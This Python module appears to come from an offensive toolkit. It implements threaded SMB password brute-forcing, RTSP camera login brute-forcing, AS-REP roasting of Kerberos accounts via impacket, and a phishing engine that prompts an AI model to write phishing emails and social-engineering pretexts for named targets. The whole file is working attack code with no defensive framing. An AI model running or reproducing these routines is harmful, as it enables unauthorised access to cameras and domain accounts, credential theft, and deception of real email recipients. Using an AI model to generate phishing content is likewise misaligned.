"""quantum.camwar.brute_v3 — BruteEngine/BruteEngineV3 (RTSP + roast) + Phish."""
from __future__ import annotations

import base64
import socket

from quantum.ai.supervisor import AI_Supervisor, no_ai_mode
from quantum.core.deps import SMBConnection
from quantum.core.jurgen import QBrain
from quantum.core.logging import log
from quantum.core.opsec import run
from quantum.core.deps import requests  # noqa: F401  (kept for parity)


class BruteEngine:
    def __init__(self): self.ai = AI_Supervisor()
    def run(self, params):
        ip, service = params["ip"], params.get("service", "smb")
        users = params.get("users", ["administrator", "admin"])
        passes = params.get("passes") or self.ai.tune_brute_wordlist(service, params.get("osint", ""))
        hits = []
        def attempt(up):
            u, p = up
            c = None
            try:
                c = SMBConnection(ip, ip, sess_port=445); c.login(u, p); hits.append((u, p))
            except Exception: pass
            finally:
                try:
                    if c: c.close()
                except Exception: pass
        from concurrent.futures import ThreadPoolExecutor
        with ThreadPoolExecutor(max_workers=16) as ex:
            list(ex.map(attempt, [(u, p) for u in users for p in passes]))
        for u, p in hits: log(f"CREDS {ip}: {u}:{p}", "OK")
        return hits


class BruteEngineV3(BruteEngine):
    """V3: RTSP DESCRIBE auth brute + kerberoast/AS-REP roast handoff."""
    def run(self, params):
        if params.get("service") == "rtsp":
            return self.rtsp_brute(params["ip"])
        if params.get("service") in ("kerberoast", "asreproast"):
            return self.roast(params["ip"], params.get("domain", ""))
        return super().run(params)

    def rtsp_brute(self, ip, port=554, wordlist=None):
        wordlist = wordlist or self.ai.tune_brute_wordlist("rtsp", "")
        creds = []
        for u in ("admin", "root", "service", "viewer"):
            for p in wordlist:
                try:
                    s = socket.create_connection((ip, port), timeout=3)
                    auth = base64.b64encode(f"{u}:{p}".encode()).decode()
                    s.sendall((f"DESCRIBE rtsp://{ip}:{port}/ RTSP/1.0\r\nCSeq: 2\r\n"
                              f"Authorization: Basic {auth}\r\n\r\n").encode())
                    r = s.recv(256); s.close()
                    if b"200" in r:
                        creds.append((u, p)); log(f"RTSP CRACKED {ip}: {u}:{p}", "CAM"); break
                except Exception: continue
        return creds

    def roast(self, ip, domain):
        out = []
        if not domain: domain = ip
        try:
            import sys
            cmd = f"{sys.executable} -m impacket.examples.GetNPUsers {domain}/ -no-pass -dc-ip {ip}"
            r = run(cmd, timeout=90)
            if r.stdout and ("$krb5asrep" in r.stdout):
                out.append(r.stdout.strip())
                log(f"ROAST: AS-REP hashes captured from {ip} (hashcat -m 18200)", "OK")
        except Exception as e:
            log(f"roast fail: {e}", "WARN")
        return out


class PhishEngine:
    def __init__(self): self.ai = AI_Supervisor()
    def launch(self, params):
        email = params["target_email"]
        body = None
        if not AI_Supervisor.ai_dead and not no_ai_mode():
            r = self.ai.query_bounded(f"Write a 4-sentence phishing email under subject "
                                       f"'{params.get('subject','Payroll')}' for {email}.", timeout=120)
            body = r
        if not body:
            body = QBrain.phish_body(email, params.get("subject", "Payroll"))
        log(f"PHISH staged -> {email}", "ATK")
        return {"email": email, "body": body}

    def social(self, params):
        if AI_Supervisor.ai_dead or no_ai_mode():
            return {"pretext": QBrain.summary(params)}
        r = self.ai.query_bounded(f"Social-engineering pretext for {params}", timeout=120)
        return {"pretext": r if r else QBrain.summary(params)}
